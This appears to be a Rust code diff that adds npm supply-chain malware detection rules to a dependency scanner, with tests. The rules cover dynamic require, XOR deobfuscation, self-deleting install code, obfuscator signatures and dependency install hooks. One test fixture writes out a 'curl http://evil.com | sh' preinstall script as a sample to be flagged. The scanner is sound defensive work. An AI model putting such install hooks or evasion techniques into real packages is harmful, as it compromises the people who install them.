@@ -110,6 +110,46 @@ const PATTERN_RULES: &[PatternRule] = &[
         severity: Severity::High,
         confidence: Confidence::Medium,
     },
+    PatternRule {
+        rule_id: "DEPSEC-P013",
+        name: "Dynamic Require",
+        description: "require() with non-literal argument — module name computed at runtime",
+        suggestion: "Dynamic require() is almost never legitimate in dependencies — this is a strong malware indicator",
+        narrative: "Calls require() with a variable, function call, or computed expression instead of a string literal. This hides the actual module being loaded, defeating static analysis. The #1 evasion technique in npm malware.",
+        pattern: r#"require\s*\(\s*[^'"`)\s]"#,
+        severity: Severity::High,
+        confidence: Confidence::Low,
+    },
+    PatternRule {
+        rule_id: "DEPSEC-P014",
+        name: "String Deobfuscation",
+        description: "String.fromCharCode with XOR/bitwise operations — deobfuscation routine",
+        suggestion: "Legitimate code rarely combines charCodeAt with XOR — this is a strong obfuscation indicator",
+        narrative: "Uses String.fromCharCode combined with XOR or bitwise operations to decode hidden strings at runtime. This is the primary obfuscation technique in npm malware like the axios/plain-crypto-js attack.",
+        pattern: r"String\.fromCharCode\s*\(.*[\^]",
+        severity: Severity::High,
+        confidence: Confidence::Medium,
+    },
+    PatternRule {
+        rule_id: "DEPSEC-P015",
+        name: "Anti-Forensic File Operations",
+        description: "Self-deleting code or evidence destruction",
+        suggestion: "Self-deleting install scripts are a hallmark of supply chain malware — investigate immediately",
+        narrative: "Deletes its own source file or replaces package.json after execution to destroy evidence. The axios/plain-crypto-js attack deleted setup.js and renamed package.md to package.json to appear clean after infection.",
+        pattern: r"(unlinkSync|rmSync)\s*\(.*(__filename|__dirname|setup\.js|package\.json)",
+        severity: Severity::Critical,
+        confidence: Confidence::High,
+    },
+    PatternRule {
+        rule_id: "DEPSEC-P017",
+        name: "Code Obfuscation",
+        description: "Common obfuscation patterns: hex identifiers, infinite loops, dynamic global access",
+        suggestion: "Obfuscated code in dependencies is a strong malware indicator — review manually",
+        narrative: "Uses patterns common in JavaScript obfuscators: hex-prefixed function names (_0x...), while(!![]) infinite loops, or dynamic global property access via Buffer.from. From Datadog GuardDog's npm-obfuscation rules.",
+        pattern: r"(?:function\s+_0x[a-fA-F0-9]|while\s*\(\s*!!\s*\[\s*\]\s*\)|global\s*\[\s*Buffer\.from\()",
+        severity: Severity::High,
+        confidence: Confidence::Medium,
+    },
 ];
 
 const BINARY_EXTENSIONS: &[&str] = &[
@@ -242,15 +282,19 @@ impl Check for PatternsCheck {
                     .to_string_lossy()
                     .to_string();
 
-                // AST analysis for JS/TS files — handles P001 and P008 with High confidence
-                // Only parse with tree-sitter if the file mentions dangerous modules or patterns.
-                // Broader than regex P001 — also catches spawn, execFile, child_process imports.
+                // AST analysis for JS/TS files — handles P001, P008, P013, P014 with High confidence
+                // Parse with tree-sitter if the file mentions dangerous modules, patterns,
+                // or signals that need structural analysis (dynamic require, deobfuscation).
                 let needs_ast = AstAnalyzer::can_analyze(path)
                     && (content.contains("child_process")
                         || content.contains("shelljs")
                         || content.contains("execa")
                         || content.contains("cross-spawn")
-                        || content.contains("new Function"));
+                        || content.contains("new Function")
+                        || content.contains("require(")   // P013: dynamic require
+                        || content.contains("fromCharCode") // P014: deobfuscation
+                        || content.contains("unlinkSync")  // P015: anti-forensic
+                        || content.contains("rmSync")); // P015: anti-forensic
 
                 let ast_handled = if needs_ast {
                     let ast_findings = ast_analyzer.analyze(path, &content);
@@ -259,6 +303,8 @@ impl Check for PatternsCheck {
                         let suggestion = match af.rule_id.as_str() {
                             "DEPSEC-P001" => "Verify commands are static or properly escaped — safe for build tools, suspicious for runtime libraries",
                             "DEPSEC-P008" => "Expected for template engines — verify template inputs are properly escaped",
+                            "DEPSEC-P013" => "Dynamic require() is almost never legitimate in dependencies — this is a strong malware indicator",
+                            "DEPSEC-P014" => "Legitimate code rarely combines charCodeAt with XOR — this is a strong obfuscation indicator",
                             _ => "Review this dependency for suspicious behavior",
                         };
                         findings.push(
@@ -308,6 +354,16 @@ impl Check for PatternsCheck {
                 if !is_minified && !ignored_rules.contains(&"DEPSEC-P007") {
                     check_entropy(&content, &rel_path, &mut findings);
                 }
+
+                // DEPSEC-P002 cross-line: base64 decode + exec/require in same file
+                if !ignored_rules.contains(&"DEPSEC-P002") {
+                    let already_has_p002 = findings.iter().any(|f| {
+                        f.rule_id == "DEPSEC-P002" && f.file.as_deref() == Some(&rel_path)
+                    });
+                    if !already_has_p002 {
+                        check_cross_line_decode_exec(&content, &rel_path, &mut findings);
+                    }
+                }
             }
         }
 
@@ -320,6 +376,14 @@ impl Check for PatternsCheck {
         if !ignored_rules.contains(&"DEPSEC-P012") {
             check_install_scripts(ctx.root, &mut findings);
         }
+
+        // DEPSEC-P016: Dependency package.json install scripts
+        if !ignored_rules.contains(&"DEPSEC-P016") {
+            check_dep_install_scripts(ctx.root, &mut findings);
+        }
+
+        // Signal combination: escalate findings when multiple weak signals co-occur
+        apply_signal_combination(&mut findings);
 
         // Apply per-package allow rules from config
         let allow_rules = &ctx.config.patterns.allow;
@@ -414,7 +478,7 @@ fn extract_package_name(rel_path: &str) -> Option<String> {
 
 /// Rules that are handled by the AST engine when the file is JS/TS
 fn is_ast_rule(rule_id: &str) -> bool {
-    matches!(rule_id, "DEPSEC-P001" | "DEPSEC-P008")
+    matches!(rule_id, "DEPSEC-P001" | "DEPSEC-P008" | "DEPSEC-P013")
 }
 
 fn is_binary_ext(path: &Path) -> bool {
@@ -600,6 +664,227 @@ fn check_install_scripts(root: &Path, findings: &mut Vec<Finding>) {
                         "Review the '{hook}' script — install scripts are a common attack vector"
                     )),
                 );
+            }
+        }
+    }
+}
+
+/// DEPSEC-P016: Scan dependency package.json files for install scripts
+/// These are the #1 entry vector for supply chain attacks (postinstall hooks).
+fn check_dep_install_scripts(root: &Path, findings: &mut Vec<Finding>) {
+    let nm_dir = root.join("node_modules");
+    if !nm_dir.exists() {
+        return;
+    }
+
+    let dangerous_hooks = ["preinstall", "postinstall", "install"];
+    let safe_scripts: &[&str] = &[
+        "husky install",
+        "husky",
+        "patch-package",
+        "node-gyp rebuild",
+        "node-gyp",
+        "tsc",
+        "esbuild",
+        "ngcc",
+        "prisma generate",
+        "nuxt prepare",
+        "npx only-allow",
+        "is-ci",
+        "opencollective",
+        "node install",
+        "prebuild-install",
+    ];
+
+    // Scan top-level and scoped packages
+    let entries = match std::fs::read_dir(&nm_dir) {
+        Ok(e) => e,
+        Err(_) => return,
+    };
+
+    for entry in entries.flatten() {
+        let path = entry.path();
+        if path
+            .file_name()
+            .and_then(|n| n.to_str())
+            .is_some_and(|n| n.starts_with('.'))
+        {
+            continue;
+        }
+
+        if path.is_dir() {
+            let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");
+            if name.starts_with('@') {
+                // Scoped package — scan children
+                if let Ok(scoped) = std::fs::read_dir(&path) {
+                    for sub in scoped.flatten() {
+                        let sub_path = sub.path();
+                        if sub_path.is_dir() {
+                            check_single_dep_package_json(
+                                root,
+                                &sub_path,
+                                &dangerous_hooks,
+                                safe_scripts,
+                                findings,
+                            );
+                        }
+                    }
+                }
+            } else {
+                check_single_dep_package_json(
+                    root,
+                    &path,
+                    &dangerous_hooks,
+                    safe_scripts,
+                    findings,
+                );
+            }
+        }
+    }
+}
+
+fn check_single_dep_package_json(
+    root: &Path,
+    pkg_dir: &Path,
+    dangerous_hooks: &[&str],
+    safe_scripts: &[&str],
+    findings: &mut Vec<Finding>,
+) {
+    let pkg_json = pkg_dir.join("package.json");
+    if !pkg_json.exists() {
+        return;
+    }
+
+    let content = match std::fs::read_to_string(&pkg_json) {
+        Ok(c) => c,
+        Err(_) => return,
+    };
+
+    let parsed: serde_json::Value = match serde_json::from_str(&content) {
+        Ok(v) => v,
+        Err(_) => return,
+    };
+
+    let scripts = match parsed.get("scripts").and_then(|s| s.as_object()) {
+        Some(s) => s,
+        None => return,
+    };
+
+    let rel_path = pkg_json
+        .strip_prefix(root)
+        .unwrap_or(&pkg_json)
+        .to_string_lossy()
+        .to_string();
+    let pkg_name = extract_package_name(&rel_path);
+
+    for hook in dangerous_hooks {
+        if let Some(script_value) = scripts.get(*hook).and_then(|s| s.as_str()) {
+            if safe_scripts
+                .iter()
+                .any(|safe| script_value.starts_with(safe))
+            {
+                continue;
+            }
+
+            findings.push(
+                Finding::new(
+                    "DEPSEC-P016",
+                    Severity::High,
+                    format!(
+                        "Dependency has '{}' script: {}",
+                        hook,
+                        truncate_line(script_value, 60)
+                    ),
+                )
+                .with_file_only(rel_path.clone())
+                .with_confidence(Confidence::High)
+                .with_suggestion(format!(
+                    "Review the '{hook}' script — install hooks in dependencies are a common attack vector"
+                ))
+                .with_package(pkg_name.clone()),
+            );
+        }
+    }
+}
+
+/// DEPSEC-P002 cross-line enhancement: detect base64 decode + exec/require in the same file
+/// but on different lines. Weaker signal than same-line (Medium confidence).
+fn check_cross_line_decode_exec(content: &str, file: &str, findings: &mut Vec<Finding>) {
+    let has_decode = content.contains("atob(")
+        || content.contains("atob (")
+        || (content.contains("Buffer.from(") && content.contains("base64"));
+
+    if !has_decode {
+        return;
+    }
+
+    let has_exec = content.contains("require(")
+        || content.contains("eval(")
+        || content.contains("exec(")
+        || content.contains("execSync(")
+        || content.contains("spawn(")
+        || content.contains("new Function(");
+
+    if has_exec {
+        findings.push(
+            Finding::new(
+                "DEPSEC-P002",
+                Severity::High,
+                "base64 decode and code execution in same file (cross-line pattern)".to_string(),
+            )
+            .with_file_only(file.to_string())
+            .with_confidence(Confidence::Medium)
+            .with_suggestion(
+                "Investigate immediately — base64-to-exec across functions is a common malware obfuscation pattern",
+            )
+            .with_package(extract_package_name(file)),
+        );
+    }
+}
+
+/// Signal combination: escalate findings when multiple weak signals co-occur in the same file.
+/// e.g., dynamic require + obfuscation = definitely malicious.
+fn apply_signal_combination(findings: &mut [Finding]) {
+    use std::collections::{HashMap, HashSet};
+
+    // Group rule IDs by file
+    let mut rules_by_file: HashMap<String, HashSet<String>> = HashMap::new();
+    for f in findings.iter() {
+        if let Some(file) = &f.file {
+            rules_by_file
+                .entry(file.clone())
+                .or_default()
+                .insert(f.rule_id.clone());
+        }
+    }
+
+    // Escalation rules
+    for (file, rules) in &rules_by_file {
+        let has_dynamic_require = rules.contains("DEPSEC-P013");
+        let has_obfuscation = rules.contains("DEPSEC-P014")
+            || rules.contains("DEPSEC-P017")
+            || rules.contains("DEPSEC-P007");
+        let has_anti_forensic = rules.contains("DEPSEC-P015");
+
+        // Dynamic require + any obfuscation → escalate P013 to Critical
+        if has_dynamic_require && (has_obfuscation || has_anti_forensic) {
+            for f in findings.iter_mut() {
+                if f.file.as_deref() == Some(file) && f.rule_id == "DEPSEC-P013" {
+                    f.severity = Severity::Critical;
+                    f.message = format!(
+                        "{} [ESCALATED: combined with obfuscation signals]",
+                        f.message
+                    );
+                }
+            }
+        }
+
+        // Anti-forensic + any exec/require signal → escalate P015
+        if has_anti_forensic && (has_dynamic_require || rules.contains("DEPSEC-P001")) {
+            for f in findings.iter_mut() {
+                if f.file.as_deref() == Some(file) && f.rule_id == "DEPSEC-P015" {
+                    f.message = format!("{} [ESCALATED: combined with code execution]", f.message);
+                }
             }
         }
     }
@@ -930,5 +1215,306 @@ mod tests {
         check_entropy(&content, "node_modules/test/file.js", &mut findings);
         // This string is sequential so might not trigger, but exercises the code
         let _ = findings;
+    }
+
+    // --- P013: Dynamic Require integration tests ---
+
+    #[test]
+    fn test_scan_detects_dynamic_require_ast() {
+        // AST should catch this with High confidence
+        let (dir, config) = setup_dep_file("const m = require(decode(stq[0]));");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P013"),
+            "Expected P013 finding, got: {:?}",
+            result
+                .findings
+                .iter()
+                .map(|f| &f.rule_id)
+                .collect::<Vec<_>>()
+        );
+    }
+
+    // --- P014: String Deobfuscation integration tests ---
+
+    #[test]
+    fn test_scan_detects_fromcharcode_xor() {
+        let (dir, config) = setup_dep_file("var c = String.fromCharCode(s.charCodeAt(0) ^ 333);");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P014"),
+            "Expected P014 finding for fromCharCode+XOR"
+        );
+    }
+
+    // --- P015: Anti-Forensic integration tests ---
+
+    #[test]
+    fn test_scan_detects_self_deletion() {
+        let (dir, config) = setup_dep_file("fs.unlinkSync(__filename);");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P015"),
+            "Expected P015 finding for self-deletion"
+        );
+    }
+
+    #[test]
+    fn test_scan_detects_package_json_deletion() {
+        let (dir, config) = setup_dep_file("unlinkSync('package.json');");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P015"),
+            "Expected P015 finding for package.json deletion"
+        );
+    }
+
+    // --- P017: Obfuscation Indicator integration tests ---
+
+    #[test]
+    fn test_scan_detects_hex_function_names() {
+        let (dir, config) = setup_dep_file("function _0x3a2f(a, b) { return a + b; }");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P017"),
+            "Expected P017 finding for hex function names"
+        );
+    }
+
+    #[test]
+    fn test_scan_detects_while_true_obfuscated() {
+        let (dir, config) = setup_dep_file("while (!![]) { break; }");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P017"),
+            "Expected P017 finding for while(!![]) pattern"
+        );
+    }
+
+    #[test]
+    fn test_scan_clean_file_no_new_rule_findings() {
+        let (dir, config) = setup_dep_file(
+            "const fs = require('fs');\nmodule.exports = function() { return 42; };",
+        );
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        let new_rules: Vec<_> = result
+            .findings
+            .iter()
+            .filter(|f| {
+                f.rule_id == "DEPSEC-P013"
+                    || f.rule_id == "DEPSEC-P014"
+                    || f.rule_id == "DEPSEC-P015"
+                    || f.rule_id == "DEPSEC-P017"
+            })
+            .collect();
+        assert!(
+            new_rules.is_empty(),
+            "Clean file should have no P013-P017 findings"
+        );
+    }
+
+    // --- P016: Dependency Install Script tests ---
+
+    #[test]
+    fn test_dep_postinstall_flagged() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let pkg_dir = dir.path().join("node_modules/evil-pkg");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"evil-pkg","scripts":{"postinstall":"node setup.js"}}"#,
+        )
+        .unwrap();
+        let config = Config::default();
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
+            "Expected P016 finding for dep postinstall script"
+        );
+    }
+
+    #[test]
+    fn test_dep_safe_script_allowed() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let pkg_dir = dir.path().join("node_modules/husky");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"husky","scripts":{"postinstall":"husky install"}}"#,
+        )
+        .unwrap();
+        let config = Config::default();
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            !result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
+            "Husky postinstall should be allowed"
+        );
+    }
+
+    #[test]
+    fn test_dep_no_scripts_no_finding() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let pkg_dir = dir.path().join("node_modules/safe-pkg");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"safe-pkg","version":"1.0.0"}"#,
+        )
+        .unwrap();
+        let config = Config::default();
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            !result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
+            "Package without scripts should have no P016 finding"
+        );
+    }
+
+    #[test]
+    fn test_scoped_package_scanned() {
+        let dir = tempfile::TempDir::new().unwrap();
+        let pkg_dir = dir.path().join("node_modules/@evil/pkg");
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            r#"{"name":"@evil/pkg","scripts":{"preinstall":"curl http://evil.com | sh"}}"#,
+        )
+        .unwrap();
+        let config = Config::default();
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        assert!(
+            result.findings.iter().any(|f| f.rule_id == "DEPSEC-P016"),
+            "Scoped package install scripts should be detected"
+        );
+    }
+
+    // --- P002 cross-line tests ---
+
+    #[test]
+    fn test_cross_line_buffer_require() {
+        let (dir, config) = setup_dep_file(
+            "var S = Buffer.from(E, \"base64\").toString(\"utf8\");\nvar t = require(decoded);",
+        );
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        let p002: Vec<_> = result
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "DEPSEC-P002")
+            .collect();
+        assert!(
+            !p002.is_empty(),
+            "Expected P002 cross-line finding for Buffer.from + require in same file"
+        );
+    }
+
+    #[test]
+    fn test_no_cross_line_without_decode() {
+        let (dir, config) = setup_dep_file("var t = require('fs');");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        let p002: Vec<_> = result
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "DEPSEC-P002")
+            .collect();
+        assert!(
+            p002.is_empty(),
+            "No base64 decode = no P002 cross-line finding"
+        );
+    }
+
+    // --- Signal combination tests ---
+
+    #[test]
+    fn test_signal_combination_escalates() {
+        // File with dynamic require + deobfuscation = P013 should escalate to Critical
+        let (dir, config) =
+            setup_dep_file("var c = String.fromCharCode(x ^ 42);\nvar m = require(decoded);");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        let p013: Vec<_> = result
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "DEPSEC-P013")
+            .collect();
+        assert!(!p013.is_empty(), "Expected P013 finding");
+        assert!(
+            p013.iter().any(|f| f.message.contains("ESCALATED")),
+            "P013 should be escalated when combined with P014 obfuscation signal"
+        );
+    }
+
+    #[test]
+    fn test_signal_single_no_escalation() {
+        // File with only dynamic require — should NOT escalate
+        let (dir, config) = setup_dep_file("var m = require(computedName);");
+        let ctx = ScanContext {
+            root: dir.path(),
+            config: &config,
+        };
+        let result = PatternsCheck.run(&ctx).unwrap();
+        let p013: Vec<_> = result
+            .findings
+            .iter()
+            .filter(|f| f.rule_id == "DEPSEC-P013")
+            .collect();
+        assert!(!p013.is_empty(), "Expected P013 finding");
+        assert!(
+            !p013.iter().any(|f| f.message.contains("ESCALATED")),
+            "Single signal should NOT be escalated"
+        );
     }
 }
